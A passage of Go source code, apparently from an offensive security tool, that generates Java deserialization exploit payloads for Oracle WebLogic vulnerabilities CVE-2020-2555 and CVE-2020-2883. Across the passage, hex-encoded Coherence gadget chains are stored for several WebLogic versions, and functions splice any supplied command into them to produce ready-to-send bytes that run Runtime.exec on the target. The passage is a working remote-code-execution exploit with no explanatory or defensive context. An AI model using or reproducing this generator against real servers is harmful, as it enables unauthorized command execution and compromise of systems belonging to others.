		after:  "7074000465786563770400000003767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707400013178",
	},

	V12212:&Payload{
		before: "ACED0005737200176A6176612E7574696C2E5072696F72697479517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B78700000000273720030636F6D2E74616E676F736F6C2E7574696C2E636F6D70617261746F722E457874726163746F72436F6D70617261746F72FB4AC83DF1D72EDC0200014C000B6D5F657874726163746F727400224C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B78707372002C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E436861696E6564457874726163746F7206EE10433A4CC4B402000078720036636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374436F6D706F73697465457874726163746F72086B3D8C05690F440200015B000C6D5F61457874726163746F727400235B4C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B7872002D636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374457874726163746F72752289AD4D4601380200014900096D5F6E546172676574787000000000757200235B4C636F6D2E74616E676F736F6C2E7574696C2E56616C7565457874726163746F723B2246204735C4A0FE0200007870000000037372002F636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F7287973791B26429DD0200035B00096D5F616F506172616D7400135B4C6A6176612F6C616E672F4F626A6563743B4C00116D5F657874726163746F724361636865647400124C6A6176612F6C616E672F4F626A6563743B4C00096D5F734D6574686F647400124C6A6176612F6C616E672F537472696E673B7871007E000900000000757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A99020000787000000000707400096765744D6574686F647371007E000D000000007571007E001200000002707571007E00120000000070740006696E766F6B657371007E000D000000007571007E001200000001757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B4702000078700000",
		after:  "7074000465786563770400000003767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707400013178",
	},
	V12211:&Payload{
		before: "ACED0005737200176A6176612E7574696C2E5072696F72697479517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B78700000000273720030636F6D2E74616E676F736F6C2E7574696C2E636F6D70617261746F722E457874726163746F72436F6D70617261746F72FB4AC83DF1D72EDC0200014C000B6D5F657874726163746F727400224C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B78707372002C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E436861696E6564457874726163746F7206EE10433A4CC4B402000078720036636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374436F6D706F73697465457874726163746F72086B3D8C05690F440200015B000C6D5F61457874726163746F727400235B4C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B7872002D636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374457874726163746F72752289AD4D4601380200014900096D5F6E546172676574787000000000757200235B4C636F6D2E74616E676F736F6C2E7574696C2E56616C7565457874726163746F723B2246204735C4A0FE0200007870000000037372002F636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F7287973791B26429DD0200035B00096D5F616F506172616D7400135B4C6A6176612F6C616E672F4F626A6563743B4C00116D5F657874726163746F724361636865647400124C6A6176612F6C616E672F4F626A6563743B4C00096D5F734D6574686F647400124C6A6176612F6C616E672F537472696E673B7871007E000900000000757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A99020000787000000000707400096765744D6574686F647371007E000D000000007571007E001200000002707571007E00120000000070740006696E766F6B657371007E000D000000007571007E001200000001757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B4702000078700000",
		after:  "7074000465786563770400000003767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707400013178",
	},

	V12210:&Payload{
		before: "ACED0005737200176A6176612E7574696C2E5072696F72697479517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B78700000000273720030636F6D2E74616E676F736F6C2E7574696C2E636F6D70617261746F722E457874726163746F72436F6D70617261746F72FB4AC83DF1D72EDC0200014C000B6D5F657874726163746F727400224C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B78707372002C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E436861696E6564457874726163746F7206EE10433A4CC4B402000078720036636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374436F6D706F73697465457874726163746F72086B3D8C05690F440200015B000C6D5F61457874726163746F727400235B4C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B7872002D636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374457874726163746F72752289AD4D4601380200014900096D5F6E546172676574787000000000757200235B4C636F6D2E74616E676F736F6C2E7574696C2E56616C7565457874726163746F723B2246204735C4A0FE0200007870000000037372002F636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F72EE7AE995C02FB4A20200025B00096D5F616F506172616D7400135B4C6A6176612F6C616E672F4F626A6563743B4C00096D5F734D6574686F647400124C6A6176612F6C616E672F537472696E673B7871007E000900000000757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647371007E000D000000007571007E001100000002707571007E001100000000740006696E766F6B657371007E000D000000007571007E001100000001757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B4702000078700000",
		after:  "74000465786563770400000003767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707400013178",
	},

	V12130:&Payload{
		before: "ACED0005737200176A6176612E7574696C2E5072696F72697479517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B78700000000273720030636F6D2E74616E676F736F6C2E7574696C2E636F6D70617261746F722E457874726163746F72436F6D70617261746F72C7AD6D3A676F3C180200014C000B6D5F657874726163746F727400224C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B78707372002C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E436861696E6564457874726163746F72889F81B0945D5B7F02000078720036636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374436F6D706F73697465457874726163746F72086B3D8C05690F440200015B000C6D5F61457874726163746F727400235B4C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B7872002D636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374457874726163746F72658195303E7238210200014900096D5F6E546172676574787000000000757200235B4C636F6D2E74616E676F736F6C2E7574696C2E56616C7565457874726163746F723B2246204735C4A0FE0200007870000000037372002F636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F72EE7AE995C02FB4A20200025B00096D5F616F506172616D7400135B4C6A6176612F6C616E672F4F626A6563743B4C00096D5F734D6574686F647400124C6A6176612F6C616E672F537472696E673B7871007E000900000000757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647371007E000D000000007571007E001100000002707571007E001100000000740006696E766F6B657371007E000D000000007571007E001100000001757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B4702000078700000",
		after:  "74000465786563770400000003767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707400013178",
	},

	V12120:&Payload{
		before: "ACED0005737200176A6176612E7574696C2E5072696F72697479517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B78700000000273720030636F6D2E74616E676F736F6C2E7574696C2E636F6D70617261746F722E457874726163746F72436F6D70617261746F72C7AD6D3A676F3C180200014C000B6D5F657874726163746F727400224C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B78707372002C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E436861696E6564457874726163746F72889F81B0945D5B7F02000078720036636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374436F6D706F73697465457874726163746F72086B3D8C05690F440200015B000C6D5F61457874726163746F727400235B4C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B7872002D636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374457874726163746F72658195303E7238210200014900096D5F6E546172676574787000000000757200235B4C636F6D2E74616E676F736F6C2E7574696C2E56616C7565457874726163746F723B2246204735C4A0FE0200007870000000037372002F636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F72EE7AE995C02FB4A20200025B00096D5F616F506172616D7400135B4C6A6176612F6C616E672F4F626A6563743B4C00096D5F734D6574686F647400124C6A6176612F6C616E672F537472696E673B7871007E000900000000757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647371007E000D000000007571007E001100000002707571007E001100000000740006696E766F6B657371007E000D000000007571007E001100000001757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B4702000078700000",
		after:  "74000465786563770400000003767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707400013178",
	},

}

var cve_payloads = map[string]map[string]*Payload {

	CVE2020_2555:cve_2020_2555_payloads,
	CVE2020_2883:cve_2020_2883_payloads,

}

func getHexLen(length int,bits int) string {

	hexStr := fmt.Sprintf("%X",length)

	hexLen := len(hexStr)

	if hexLen>=bits {
		return hexStr
	}

	fillZeros := make([]string,0)

	if hexLen < bits {
		for i := 0; i < bits - hexLen; i++ {
			fillZeros = append(fillZeros,"0")
		}
	}

	return strings.Join(fillZeros,"")+hexStr
}

func makeCmdPayload(cmd,version,cve string) string {

	var pload *Payload
	var payloads map[string]*Payload
	var ok bool
	cmdPayload := make([]string,0)

	if cve == "" {
		payloads = cve_2020_2555_payloads
	}else {

		if payloads,ok = cve_payloads[cve];!ok {
			payloads = cve_2020_2555_payloads
		}
	}

	if version == "" {
		pload = payloads[DefaultVersion]
	}else {
		if pload,ok = payloads[version]; !ok {
			pload = payloads[DefaultVersion]
		}
	}

	cmds := strings.Split(cmd,",")

	cmdSLenHex := getHexLen(len(cmds),4)

	for _,c := range cmds {

		cmdHex := hex.EncodeToString([]byte(c))
		cmdPayload = append(cmdPayload,fmt.Sprintf("%s%s",getHexLen(len(c),4),cmdHex))
	}

	cmdPayloadHex := strings.Join(cmdPayload,"74")

	return fmt.Sprintf("%s%s74%s%s",pload.before,cmdSLenHex,cmdPayloadHex,pload.after)

}

func MakeWeblogicPayload(cmd,version,cve string) ([]byte,error) {

	cmdPayload := makeCmdPayload(cmd,version,cve)

	payload := fmt.Sprintf("%s%s%s",PrePayload,cmdPayload,PosPayload)

	plen := len(payload)/2

	plenHex := getHexLen(plen+4,8)

	return hex.DecodeString(fmt.Sprintf("%s%s",plenHex,payload))
}

func MakeWeblogicPayloadHex(cmd,version, cve string) string {

	cmdPayload := makeCmdPayload(cmd,version,cve)

	payload := fmt.Sprintf("%s%s%s",PrePayload,cmdPayload,PosPayload)

	plen := len(payload)/2

	plenHex := getHexLen(plen+4,8)

	return fmt.Sprintf("%s%s",plenHex,payload)
}

